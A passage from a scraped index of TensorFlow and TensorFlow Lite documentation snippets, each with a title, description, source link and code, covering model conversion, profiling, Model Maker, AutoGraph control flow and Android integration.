  pod 'TensorFlowLiteTaskText', '~> 0.4.4'
end
```

----------------------------------------

TITLE: Cross-Compile TFLite Pip via Docker/Make (Shell)
DESCRIPTION: Uses the `make` tool to trigger a Docker-based build process for TensorFlow Lite. Environment variables like `BASE_IMAGE`, `PYTHON_VERSION`, and `TENSORFLOW_TARGET` are set to define the target environment, enabling cross-compilation for specific architectures and Python versions, such as Raspberry Pi (rpi) with Debian Buster.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_2

LANGUAGE: sh
CODE:
```
make BASE_IMAGE=debian:buster PYTHON_VERSION=2.7 TENSORFLOW_TARGET=rpi docker-build
make BASE_IMAGE=debian:buster PYTHON_VERSION=3.7 TENSORFLOW_TARGET=rpi docker-build
```

----------------------------------------

TITLE: Example Listing SignatureDefs TensorFlow Lite Python
DESCRIPTION: Demonstrates how to call the `get_signature_list()` method on an interpreter instance and print the resulting dictionary, showing the names of the available SignatureDefs and the names of their input and output tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_8

LANGUAGE: python
CODE:
```
signatures = interpreter.get_signature_list()
print(signatures)

# {
#   'add': {'inputs': ['x', 'y'], 'outputs': ['output_0']}
# }
```

----------------------------------------

TITLE: Exporting and Importing Layer Statistics CSV (Python)
DESCRIPTION: Export the aggregated layer statistics to a CSV file using `quant_debugger.layer_statistics_dump()`, providing a file-like object. The CSV includes op names, tensor IDs, and quantization parameters. Use pandas to read the CSV, utilizing a converter (like `yaml.safe_load`) to properly parse list-like columns such as scales and zero points.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_5

LANGUAGE: python
CODE:
```
import pandas as pd
import yaml  # used to parse lists

with open('/path/to/stats.csv', 'w') as f:
  quant_debugger.layer_statistics_dump(f)

data = pd.read_csv(
    '/path/to/stats.csv',
    converters={
        'scales': yaml.safe_load,
        'zero_points': yaml.safe_load
    })
```

----------------------------------------

TITLE: Multi-Step Profiling with TensorFlow Profiler (Python)
DESCRIPTION: Shows how to use `model_analyzer.Profiler` to accumulate and analyze profiling data across multiple training or evaluation steps. It involves adding `RunMetadata` for each step to the profiler instance before performing analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_5

LANGUAGE: python
CODE:
```
opts = model_analyzer.PRINT_ALL_TIMING_MEMORY.copy()
opts['account_type_regexes'] = ['.*']

with session.Session() as sess:
  r1, r2, r3 = lib.BuildSplittableModel()
  sess.run(variables.global_variables_initializer())

  # Create a profiler.
  profiler = model_analyzer.Profiler(sess.graph)
  # Profile without RunMetadata of any step.
  pb0 = profiler.profile_name_scope(opts)

  run_meta = config_pb2.RunMetadata()
  _ = sess.run(r1,
               options=config_pb2.RunOptions(
                   trace_level=config_pb2.RunOptions.FULL_TRACE),
               run_metadata=run_meta)

  # Add run_meta of step 1.
  profiler.add_step(1, run_meta)
  pb1 = profiler.profile_name_scope(opts)

  run_meta2 = config_pb2.RunMetadata()
  _ = sess.run(r2,
               options=config_pb2.RunOptions(
                   trace_level=config_pb2.RunOptions.FULL_TRACE),
               run_metadata=run_meta2)
  # Add run_meta of step 2.
  profiler.add_step(2, run_meta2)
  pb2 = profiler.profile_name_scope(opts)

  run_meta3 = config_pb2.RunMetadata()
  _ = sess.run(r3,
               options=config_pb2.RunOptions(
                   trace_level=config_pb2.RunOptions.FULL_TRACE),
               run_metadata=run_meta3)
  # Add run_meta of step 3.
  profiler.add_step(3, run_meta3)
  pb3 = profiler.profile_name_scope(opts)
```

----------------------------------------

TITLE: Push Model Labels to Android Device - Shell
DESCRIPTION: Transfers the text file containing model output labels (e.g., `labelmap.txt`) from the local machine to the temporary directory (`/data/local/tmp`) on the connected Android device using ADB.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
adb push /path/to/labelmap.txt /data/local/tmp/labelmap.txt
```

----------------------------------------

TITLE: For Loop Over Stacked Tensor - TensorFlow Python
DESCRIPTION: Demonstrates how to ensure a `for` loop is converted into a TensorFlow loop. By stacking the list of Tensors into a single `tf.Tensor` (`tf.stack(l)`) and iterating over that Tensor, AutoGraph generates a TensorFlow loop (`tf.while_loop`), rather than unrolling.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_18

LANGUAGE: Python
CODE:
```
l = [tf.constant(1), tf.constant(2), tf.constant(3)]
for i in tf.stack(l):
  tf.print(i)  # This runs as a TensorFlow loop.
```

----------------------------------------

TITLE: Exporting Specific Files - TensorFlow Lite Model Maker - Python
DESCRIPTION: Exports only the specified related files from the trained model, such as the label file (`ExportFormat.LABEL`) and the vocabulary file (`ExportFormat.VOCAB`), to the given directory for examination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
model.export(export_dir='mobilebert/', export_format=[ExportFormat.LABEL, ExportFormat.VOCAB])
```

----------------------------------------

TITLE: Creating MetadataWriter from Metadata Info Objects (Python)
DESCRIPTION: This class method creates a MetadataWriter instance based on structured information provided through specific "metadata info" objects. It takes the model buffer and optional objects for general model information (GeneralMd), input image tensor information (InputImageTensorMd), and output classification tensor information (ClassificationTensorMd). Default metadata is generated for any info objects not provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/GeneralMd"><code>tflite_support.metadata_writers.metadata_info.GeneralMd</code></a>] = None,
    input_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/InputImageTensorMd"><code>tflite_support.metadata_writers.metadata_info.InputImageTensorMd</code></a>] = None,
    output_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/ClassificationTensorMd"><code>tflite_support.metadata_writers.metadata_info.ClassificationTensorMd</code></a>] = None
)
```

----------------------------------------

TITLE: Initialize Image ModelSpec Python
DESCRIPTION: Initializes an instance of `ModelSpec`. It takes the URI to a pretrained model, a list of compatible TensorFlow versions, an optional input image shape (defaulting to [224, 224]), and an optional name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ModelSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.ModelSpec(\n    uri, compat_tf_versions=None, input_image_shape=None, name='')\n
```

----------------------------------------

TITLE: Loop Emitter Generated MLIR for GELU
DESCRIPTION: This snippet shows the MLIR code generated by the loop emitter for a simple GELU HLO computation. It includes the main kernel function (`@main`) that iterates over output elements using `xla_gpu.loop` and a private helper function (`@gelu`) that implements the elementwise GELU logic, called via `xla_gpu.pure_call`. It demonstrates using GPU thread/block IDs, indexing maps, tensor extraction/insertion, and basic arithmetic/math operations in MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_0

LANGUAGE: MLIR
CODE:
```
#map = #xla_gpu.indexing_map<"(th_x, bl_x)[vector_index] -> (\n bl_x floordiv 4096, (bl_x floordiv 8) mod 512, (bl_x mod 8) * 512 + th_x * 4 + vector_index),\n domain: th_x in [0, 127], bl_x in [0, 24575], vector_index in [0, 3]">\n\nfunc.func @main(%input: tensor<6x512x4096xbf16> , %output: tensor<6x512x4096xbf16>)\n   -> tensor<6x512x4096xbf16> {\n %thread_id_x = gpu.thread_id  x {xla.range = [0 : index, 127 : index]}\n %block_id_x = gpu.block_id  x {xla.range = [0 : index, 24575 : index]}\n\n %xla_loop = xla_gpu.loop (%thread_id_x, %block_id_x)[%vector_index] -> (%dim0, %dim1, %dim2)\n     in #map iter_args(%iter = %output) -> (tensor<6x512x4096xbf16>) {\n   %pure_call = xla_gpu.pure_call @gelu(%input, %dim0, %dim1, %dim2)\n      : (tensor<6x512x4096xbf16>, index, index, index) -> bf16\n   %inserted = tensor.insert %pure_call into %iter[%dim0, %dim1, %dim2] : tensor<6x512x4096xbf16>\n   xla_gpu.yield %inserted : tensor<6x512x4096xbf16>\n }\n return %xla_loop : tensor<6x512x4096xbf16>\n}\n\nfunc.func private @gelu(%arg0: tensor<6x512x4096xbf16>, %i: index, %j: index, %k: index) -> bf16 {\n  %cst = arith.constant 5.000000e-01 : bf16\n  %cst_0 = arith.constant 1.000000e+00 : bf16\n  %cst_1 = arith.constant 7.968750e-01 : bf16\n  %cst_2 = arith.constant 4.467770e-02 : bf16\n  %extracted = tensor.extract %arg0[%i, %j, %k] : tensor<6x512x4096xbf16>\n  %0 = arith.mulf %extracted, %extracted : bf16\n  %1 = arith.mulf %0, %extracted : bf16\n  %2 = arith.mulf %1, %cst_2 : bf16\n  %3 = arith.addf %extracted, %2 : bf16\n  %4 = arith.mulf %3, %cst_1 : bf16\n  %5 = math.tanh %4 : bf16\n  %6 = arith.addf %5, %cst_0 : bf16\n  %7 = arith.mulf %6, %cst : bf16\n  %8 = arith.mulf %extracted, %7 : bf16\n  return %8 : bf16\n}
```

----------------------------------------

TITLE: Initializing tflite_support.metadata_writers.object_detector.MetadataWriter Class - Python
DESCRIPTION: This snippet shows the constructor signature for the `MetadataWriter` class used to initialize an object capable of writing metadata to a TensorFlow Lite object detection model. It requires the model's byte buffer and optionally accepts a metadata buffer and a list of paths to associated files for population.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.object_detector.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Creating Average WordVec Spec - TensorFlow Lite Model Maker - Python
DESCRIPTION: Instantiates a new model specification for the Average Word Embedding architecture, customizing the `wordvec_dim` parameter to set the dimension of the word vectors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_23

LANGUAGE: python
CODE:
```
new_model_spec = AverageWordVecSpec(wordvec_dim=32)
```

----------------------------------------

TITLE: Starting Audio Recording with Android AudioRecord (Kotlin)
DESCRIPTION: Initiates audio recording using the configured Android AudioRecord object. It first checks if the recording is already active to prevent redundant calls. If not recording, it starts the audio capture process from the device's microphone, providing the input stream for subsequent classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_8

LANGUAGE: kotlin
CODE:
```
fun startAudioClassification() {
  if (recorder.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
    return
  }
  recorder.startRecording()
}
```

----------------------------------------

TITLE: Generating TF Dataset with AudioDataLoader (Python)
DESCRIPTION: Generates a batched TensorFlow `tf.data.Dataset` from the loaded audio data, suitable for consumption by a Keras model during training or evaluation. Allows specifying the `batch_size`, whether it's for `is_training` (enabling shuffling and augmentation), optional `shuffle` control, and `input_pipeline_context` for distributed training. Can also control if the final batch drops the remainder. Returns a TensorFlow dataset instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_3

LANGUAGE: python
CODE:
```
gen_dataset(
    batch_size=1,
    is_training=False,
    shuffle=False,
    input_pipeline_context=None,
    preprocess=None,
    drop_remainder=False
)
```

----------------------------------------

TITLE: Create ObjectDetector Instance from File and Options - Kotlin
DESCRIPTION: Creates an instance of the `ObjectDetector` using the specified model file name and the previously configured options. This fully initializes the detector, making it ready to perform object detection on input data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_8

LANGUAGE: Kotlin
CODE:
```
objectDetector =
    ObjectDetector.createFromFileAndOptions(
        context, modelName, optionsBuilder.build())
```

----------------------------------------

TITLE: Extract TFLite Model Metadata Python
DESCRIPTION: Provides Python functions to extract crucial information, specifically classification labels and the expected audio sample rate, directly from the metadata embedded within a TensorFlow Lite model file. Requires the 'tflite_support' library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
from tflite_support import metadata
import json

def get_labels(model):
  """Returns a list of labels, extracted from the model metadata."""
  displayer = metadata.MetadataDisplayer.with_model_file(model)
  labels_file = displayer.get_packed_associated_file_list()[0]
  labels = displayer.get_associated_file_buffer(labels_file).decode()
  return [line for line in labels.split('\n')]

def get_input_sample_rate(model):
  """Returns the model's expected sample rate, from the model metadata."""
  displayer = metadata.MetadataDisplayer.with_model_file(model)
  metadata_json = json.loads(displayer.get_metadata_json())
  input_tensor_metadata = metadata_json['subgraph_metadata'][0][
          'input_tensor_metadata'][0]
  input_content_props = input_tensor_metadata['content']['content_properties']
  return input_content_props['sample_rate']
```

----------------------------------------

TITLE: Defining Model Parameters - Python
DESCRIPTION: This sets the key hyperparameters for the RNN model: `vocab_size` (the number of unique characters) and `embedding_dim` (the size of the embedding layer's output dimension). These values are needed when defining the model architecture.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
# Length of the vocabulary in chars
vocab_size = len(vocab)

# The embedding dimension
embedding_dim = 256
```

----------------------------------------

TITLE: Defining and Applying Image Preprocessing Functions (Python)
DESCRIPTION: Defines two utility functions: `load_img` for loading an image file, decoding it, converting its data type, and adding a batch dimension; and `preprocess_image` for resizing and central cropping an image to a target square dimension. It then loads the downloaded content and style images and applies the preprocessing functions to resize them to the required input dimensions (384x384 for content, 256x256 for style) and prints their resulting shapes. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
# Function to load an image from a file, and add a batch dimension.
def load_img(path_to_img):
  img = tf.io.read_file(path_to_img)
  img = tf.io.decode_image(img, channels=3)
  img = tf.image.convert_image_dtype(img, tf.float32)
  img = img[tf.newaxis, :]

  return img

# Function to pre-process by resizing an central cropping it.
def preprocess_image(image, target_dim):
  # Resize the image so that the shorter dimension becomes 256px.
  shape = tf.cast(tf.shape(image)[1:-1], tf.float32)
  short_dim = min(shape)
  scale = target_dim / short_dim
  new_shape = tf.cast(shape * scale, tf.int32)
  image = tf.image.resize(image, new_shape)

  # Central crop the image.
  image = tf.image.resize_with_crop_or_pad(image, target_dim, target_dim);

  return image

# Load the input images.
content_image = load_img(content_path)
style_image = load_img(style_path)

# Preprocess the input images.
preprocessed_content_image = preprocess_image(content_image, 384)
preprocessed_style_image = preprocess_image(style_image, 256)

print('Style Image Shape:', preprocessed_style_image.shape)
print('Content Image Shape:', preprocessed_content_image.shape)
```

----------------------------------------

TITLE: Defining Function to Stack TensorFlow Custom Ops (Python)
DESCRIPTION: Defines a Python function `stack50` that creates a `tf.stack` of 50 instances of a given custom sleep op (`SyncSleep` or `AsyncSleep`), each with a slightly different delay input. It measures and prints the total execution time and the returned values from the ops to demonstrate the difference in behavior between synchronous and asynchronous execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_12

LANGUAGE: python
CODE:
```
def stack50(op, delay):
  """Create a tf.stack of 50 sleep ops.

  Args:
    op: The sleep op, either sleep_op.SyncSleep or sleep_op.AsyncSleep.
    delay: Each op should finish at least float `delay` seconds after it starts.
  """
  n = 50
  delays = delay + tf.range(0, n, dtype=float) / 10000.0
  start_t = time.time()
  func = tf.function(lambda: tf.stack([op(delays[i]) for i in range(n)]))
  r_numpy = func().numpy()
  end_t = time.time()
  print('')
  print('Total time = %5.3f seconds using %s' % (end_t - start_t, str(op)))
  print('Returned values from the ops:')
  np.set_printoptions(precision=4, suppress=True)
  print(r_numpy)
  sys.stdout.flush()
```

----------------------------------------

TITLE: Initializing TFLite ImageClassifier Python
DESCRIPTION: This code snippet presents the constructor signature for the `ImageClassifier` class in TensorFlow Lite Model Maker. It outlines the parameters required to instantiate an `ImageClassifier` object, which is used for building or loading image classification models. Key parameters include the model specification, mapping from index to label, shuffling options, hyperparameters, data augmentation flag, and optional representative data for quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.image_classifier.ImageClassifier(
    model_spec,
    index_to_label,
    shuffle=True,
    hparams=hub_lib.get_default_hparams(),
    use_augmentation=False,
    representative_data=None
)
```

----------------------------------------

TITLE: Converting SavedModel with User Defined Ops Python
DESCRIPTION: This snippet shows how to convert a SavedModel containing user-defined TensorFlow operators. It requires loading the custom op library and listing the specific operator names in `converter.target_spec.experimental_select_user_tf_ops` in addition to enabling `SELECT_TF_OPS`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/op_select_allowlist.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

ops_module = tf.load_op_library('./your_ops_library.so')

converter = tf.lite.TFLiteConverter.from_saved_model(your_model)
converter.target_spec.supported_ops = [
  tf.lite.OpsSet.TFLITE_BUILTINS, tf.lite.OpsSet.SELECT_TF_OPS
]
converter.target_spec.experimental_select_user_tf_ops = [
    'your_op_name1',
    'your_op_name2'
]
model_data = converter.convert()
```

----------------------------------------

TITLE: Enable GPU Acceleration with Task Library (Google Play Services) - Kotlin
DESCRIPTION: Asynchronously checks if the GPU delegate is available via Google Play services and configures the BaseOptions for a Task API model (like ObjectDetector) to use the GPU if available. This prepares the options object before creating the detector instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_1

LANGUAGE: Kotlin
CODE:
```
val useGpuTask = TfLiteGpu.isGpuDelegateAvailable(context)

lateinit val optionsTask = useGpuTask.continueWith { task ->
  val baseOptionsBuilder = BaseOptions.builder()
  if (task.result) {
    baseOptionsBuilder.useGpu()
  }
ObjectDetectorOptions.builder()
          .setBaseOptions(baseOptionsBuilder.build())
          .setMaxResults(1)
          .build()
}
```

----------------------------------------

TITLE: Creating TensorImage from binary buffer (Python)
DESCRIPTION: Creates a TensorImage object by decoding image data from a binary memory buffer. This method is suitable for loading images represented as raw bytes in memory, raising a RuntimeError if the buffer cannot be decoded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/TensorImage.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_buffer(
    buffer: str
) -> 'TensorImage'
```

----------------------------------------

TITLE: if Statement with Python/NumPy Condition - Python
DESCRIPTION: A Python `if` statement where the condition is a Python/NumPy value. AutoGraph will execute this statement as normal Python control flow, as the condition is not a `tf.Tensor`. The decision is made during tracing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_14

LANGUAGE: Python
CODE:
```
if np.random.uniform() > 0.5:
  x = 1
else:
  x = 2
```

----------------------------------------

TITLE: Adding TensorFlow Lite Support Library Dependency (Gradle)
DESCRIPTION: This snippet shows the required Gradle dependency to add the TensorFlow Lite Support Library AAR from MavenCentral to an Android project's `build.gradle` file. This library provides helper APIs for data transformation and pre/post-processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_3

LANGUAGE: Gradle
CODE:
```
dependencies {
    implementation 'org.tensorflow:tensorflow-lite-support:+'
}
```

----------------------------------------

TITLE: Creating TensorImage from file (Python)
DESCRIPTION: Creates a TensorImage object by loading and decoding an image from a specified file path. This is a convenient class method for reading image files directly from disk, raising a RuntimeError if the file cannot be decoded.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/TensorImage.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_name: str
) -> 'TensorImage'
```

----------------------------------------

TITLE: Creating TFLite Support TextSearcher from File (Python)
DESCRIPTION: A class method to create a `TextSearcher` instance from a TensorFlow Lite model file path. Optionally accepts a separate index file path if the index is not embedded in the model metadata. It returns a configured `TextSearcher` object or raises `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcher.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    model_file_path: str, index_file_path: Optional[str] = None
) -> 'TextSearcher'
```

----------------------------------------

TITLE: Creating TextEmbedder From File - Python
DESCRIPTION: Creates a TextEmbedder object by loading a TensorFlow Lite model from a specified file path. This is a class method used for convenient initialization from a model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'TextEmbedder'
```

----------------------------------------

TITLE: Prepare Model Dataset and Quantize TFLite Python
DESCRIPTION: Sets up a MobileNet v3 Keras model from TF Hub, loads and preprocesses a small subset of the Imagenet v2 dataset, defines helper functions for image processing, representative dataset generation, and TFLite evaluation, then performs initial full-integer quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_3

LANGUAGE: Python
CODE:
```
#@title Boilerplates and helpers
MODEL_URI = 'https://tfhub.dev/google/imagenet/mobilenet_v3_small_100_224/classification/5'


def process_image(data):
  data['image'] = tf.image.resize(data['image'], (224, 224)) / 255.0
  return data


# Representative dataset
def representative_dataset(dataset):

  def _data_gen():
    for data in dataset.batch(1):
      yield [data['image']]

  return _data_gen


def eval_tflite(tflite_model, dataset):
  """Evaluates tensorflow lite classification model with the given dataset."""
  interpreter = tf.lite.Interpreter(model_content=tflite_model)
  interpreter.allocate_tensors()

  input_idx = interpreter.get_input_details()[0]['index']
  output_idx = interpreter.get_output_details()[0]['index']

  results = []

  for data in representative_dataset(dataset)():
    interpreter.set_tensor(input_idx, data[0])
    interpreter.invoke()
    results.append(interpreter.get_tensor(output_idx).flatten())

  results = np.array(results)
  gt_labels = np.array(list(dataset.map(lambda data: data['label'] + 1)))
  accuracy = (
      np.sum(np.argsort(results, axis=1)[:, -5:] == gt_labels.reshape(-1, 1)) /
      gt_labels.size)
  print(f'Top-5 accuracy (quantized): {accuracy * 100:.2f}%')


model = tf.keras.Sequential([
  tf.keras.layers.Input(shape=(224, 224, 3), batch_size=1),
  hub.KerasLayer(MODEL_URI)
])
model.compile(
    loss='sparse_categorical_crossentropy',
    metrics='sparse_top_k_categorical_accuracy')
model.build([1, 224, 224, 3])

# Prepare dataset with 100 examples
ds = tfds.load('imagenet_v2', split='test[:1%]')
ds = ds.map(process_image)

test_ds = ds.map(lambda data: (data['image'], data['label'] + 1)).batch(16)

converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.representative_dataset = representative_dataset(ds)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
quantized_model = converter.convert()
```

----------------------------------------

TITLE: Demonstrating Python Print in tf.function (Python/TensorFlow)
DESCRIPTION: This snippet defines a TensorFlow function `f` using `@tf.function`. It includes a standard Python `print(a)` statement to show how the input `a` is printed during the graph construction phase, which differs depending on whether `a` is a Python value or a `tf.Tensor`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_3

LANGUAGE: python
CODE:
```
@tf.function
def f(a):
  print(a)
  if a > 0:
    a = -a
```

----------------------------------------

TITLE: Run TFLite Native Benchmark on Android via ADB
DESCRIPTION: Executes the TensorFlow Lite native benchmark binary on a connected Android device using ADB shell. This command configures the number of threads, specifies the model path, and sets the number of warmup and measured runs. It requires the benchmark binary and the TFLite model to be present on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_6

LANGUAGE: sh
CODE:
```
adb shell /data/local/tmp/benchmark_model \
  --num_threads=4 \
  --graph=/data/local/tmp/tflite_models/${GRAPH} \
  --warmup_runs=1 \
  --num_runs=50
```

----------------------------------------

TITLE: Instantiating and Registering TFLite Micro Ops (C++)
DESCRIPTION: Creates an instance of the specialized operation resolver (`HelloWorldOpResolver`) and calls the `RegisterOps` function to populate it with the necessary operations required by the model (like `AddFullyConnected`). `TF_LITE_ENSURE_STATUS` checks for errors during operation registration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_7

LANGUAGE: C++
CODE:
```
HelloWorldOpResolver op_resolver;
TF_LITE_ENSURE_STATUS(RegisterOps(op_resolver));


```

----------------------------------------

TITLE: Run TensorFlow tfprof Advise using Python API
DESCRIPTION: Demonstrates how to use the TensorFlow Python API to collect profiling data during a session run and then invoke the tfprof 'advise' feature. This involves creating a Profiler object, running the session with full trace enabled, adding the run metadata to the profiler, and finally calling the advise method. A one-shot API call is also shown.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/advise.md#_snippet_0

LANGUAGE: Python
CODE:
```
# First create a profiler. See profiler tutorials for more details.
profiler = tf.profiler.Profiler(sess.graph)
run_meta = config_pb2.RunMetadata()
_ = sess.run(r1,
             options=config_pb2.RunOptions(
                 trace_level=config_pb2.RunOptions.FULL_TRACE),
             run_metadata=run_meta)
profiler.add_step(1, run_meta)

# Then Start advise.
profiler.advise()

# For one-shot API
tf.profiler.advise(
    sess.graph, run_meta=run_metadata)
```

----------------------------------------

TITLE: Enabling MLIR Bridge in TF 2.x Python
DESCRIPTION: This snippet shows the recommended method for enabling the experimental MLIR-based TPU bridge in TensorFlow 2.x, where sessions and config objects are less common. The `tf.config.experimental.enable_mlir_bridge()` function is called directly, which modifies the global TensorFlow context. This call must be placed early in the program execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/enable_mlir_bridge.md#_snippet_1

LANGUAGE: Python
CODE:
```
tf.config.experimental.enable_mlir_bridge()
```

----------------------------------------

TITLE: Initializing YamNetSpec [Python]
DESCRIPTION: Initializes the YamNetSpec class, configuring the model specification for creating an audio classifier. It allows specifying the checkpoint directory, distribution strategy, the YAMNet TFHub model handle, frame parameters for audio processing, and whether to keep both YAMNet and custom heads in the final model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.audio_classifier.YamNetSpec(
    model_dir: None = None,
    strategy: None = None,
    yamnet_model_handle='https://tfhub.dev/google/yamnet/1',
    frame_length=EXPECTED_WAVEFORM_LENGTH,
    frame_step=(EXPECTED_WAVEFORM_LENGTH // 2),
    keep_yamnet_and_custom_heads=True
)
```

----------------------------------------

TITLE: Install Project Requirements (Setup)
DESCRIPTION: This snippet provides the standard command to install all project dependencies. It reads the required package list from a 'requirements.txt' file using pip.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/Winner_OSS_Template.md#_snippet_0

LANGUAGE: setup
CODE:
```
pip install -r requirements.txt
```

----------------------------------------

TITLE: Creating ObjectDetector from File Path in Python
DESCRIPTION: This class method creates an `ObjectDetector` instance by loading a TensorFlow Lite model directly from a file path. It's a convenient way to initialize the detector with default options based on the model's metadata. It may raise `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetector.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'ObjectDetector'
```

----------------------------------------

TITLE: Inspecting Individual Input/Target Steps - Python
DESCRIPTION: This code iterates through the first few characters of the example input and target sequences, printing the index and character for each step. This clarifies the prediction task, showing that for each input character, the model is expected to predict the subsequent target character.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
for i, (input_idx, target_idx) in enumerate(zip(input_example[:5], target_example[:5])):
    print("Step {:4d}".format(i))
    print("  input: {} ({:s})".format(input_idx, repr(idx2char[input_idx])))
    print("  expected output: {} ({:s})".format(target_idx, repr(idx2char[target_idx])))
```

----------------------------------------

TITLE: Initializing TensorFlow Lite BERT QA Model - Kotlin
DESCRIPTION: Initializes the BertQuestionAnswerer object using the specified model file and configuration options. It includes setting base options like the number of threads and building the specific BERT QA options before attempting to create the answerer instance, with error handling for initialization failures using a try-catch block.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_2

LANGUAGE: Kotlin
CODE:
```
class BertQaHelper(
 ...
) {
 ...
 init {
 setupBertQuestionAnswerer()
 }

 fun clearBertQuestionAnswerer() {
 bertQuestionAnswerer = null
 }

